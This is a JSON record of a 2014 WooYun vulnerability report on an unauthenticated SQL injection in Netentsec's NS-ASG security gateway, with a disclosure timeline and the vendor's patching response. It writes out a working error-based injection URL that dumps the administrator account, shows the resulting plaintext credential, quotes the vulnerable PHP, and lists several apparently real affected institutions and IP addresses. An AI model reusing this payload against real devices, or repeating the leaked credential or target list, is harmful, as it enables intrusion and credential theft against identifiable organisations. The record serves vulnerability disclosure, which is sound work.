{"id": 2574, "wybug_id": "wooyun-2014-058945", "wybug_title": "网康 NS-ASG 应用安全网关SQL注入漏洞", "wybug_corp": "网康科技", "wybug_author": "狗狗侠", "wybug_date": "2014-04-30 13:59", "wybug_open_date": "2014-07-29 14:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-29：\t细节向公众公开  简要描述：   我也来发注入，无限制，不需登录，默认即可注入 直接出来管理员账号和密码，并且是明文。。。真是佩服网康，md5一下，你会怀孕么 详细说明：    我也来发注入，无限制，不需登录，默认即可注入 直接出来管理员账号和密码，并且是明文。。。真是佩服网康，md5一下，你会怀孕么  剑总，疯狗叔叔，你们不会认为我发洞太多了吧？初步稍微搜索统计下：涉及以下单位及学校：https://vpn.lib.tju.edu.cnhttps:// 211.68.223.12https://221.213.45.231https://202.113.20.208https://202.113.49.100/https://122.226.150.69https://gljy.cnhttps://202.196.119.130https://211.82.48.60/直接开菊花....https://333.xxx.xxx/admin/config_Anticrack.php?GroupId=222 and 1=(updatexml(1,concat(0x5e24,(select concat(0x3a,AdminName,0x3a,Passwd,0x3a) from Admin limit 0,1),0x5e24),1))—a查询组零缓存配置信息XPATH syntax error: '^$:SuperAdmin:li211ssl5460:^$'(明文哦）0x01:\n<? include(\"../include/common.inc\");$dbh = db_connect();switch ($action){\tcase \"\":\t\tlist_nocacheform(); //漏洞产生函数\t\tbreak;\tcase \"add\":\t\t$gid = $GroupId;           ......//省略若干代码\n跟踪该函数list_nocacheform()\nfunction list_nocacheform(){\tglobal $GroupId;\t$dbh = db_connect();\t$query = db_query($dbh,\"SELECT LoginTimes,Timeout FROM ISCGroupAnticrack WHERE GroupId=$GroupId\",\"查询组零缓存配置信息\");//直接报错注入即可。\t$Anticrackinfo = db_fetch_row($query);\t$action = $Anticrackinfo?'update':'add';\tlist($LoginTimes,$Timeout) = $Anticrackinfo;\tlist($GroupName) = db_fetch_row(db_query($dbh,\"SELECT GroupName FROM ISCGroupTable WHERE GroupId=$GroupId\",\"查询用户组信息\"));\n只要admin/config_Anticrack.php?GroupId=222 and 1=(updatexml(1,concat(0x5e24,(select concat(0x3a,AdminName,0x3a,Passwd,0x3a) from Admin limit 0,1),0x5e24),1))—a 一下。。然后明文的账号和密码就出来了。。。真是替网康捏一把汗啊。。。   漏洞证明：  https://333.xxx.xxx/admin/config_Anticrack.php?GroupId=222 and 1=(updatexml(1,concat(0x5e24,(select concat(0x3a,AdminName,0x3a,Passwd,0x3a) from Admin limit 0,1),0x5e24),1))—a   修复方案：  。。。   版权声明：转载请注明来源 狗狗侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-01 22:05 厂商回复： 4月29日，网康收到CNVD漏洞细节通知，迅速启动并同时展开了以下工作：1.进一步验证漏洞细节，目前已确认所曝漏洞确实存在于ASG产品；2.对全线产品进行安全自查，重点确认ASG产品是否仍存其它未知漏洞，并验证类似漏洞是否同存于其它产品线，截至目前，自查工作仍在进行中，全线产品暂未发现新的漏洞；3.开发用于漏洞修补的更新程序，将尽快发布应急补丁包，介时用户可通过操作设备管理界面直接安装该更新程序以对所曝漏洞进行应急性修补；4.售后服务部通过内部CRM系统导出全部ASG用户名单，并开始逐一联系用户通报漏洞情况，补丁包发布后，将再次逐一通知所有用户及时安装更新，此项工作预计3工作日内完成；5.为避免统计疏漏，工程部于4月30日16:00向CNVD共享了在线ASG设备的辨识方法，将配合CNVD共同开展在线设备的主动探测工作，一旦发现未更新补丁的在线设备，将联系并协助用户及时更新，此项工作预计10工作日内完成；6.将尽快向社会开放漏洞提交邮箱，接受第三方机构、白帽子及其它组织、个人向网康提交产品漏洞，向所有帮助网康产品进步的组织和人士表示感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-04 23:48 |    \t\t破锁 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:6        )\t\t \n  一下爆了网康这么多漏洞！牛逼啊！估计厂商怕怀孕！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}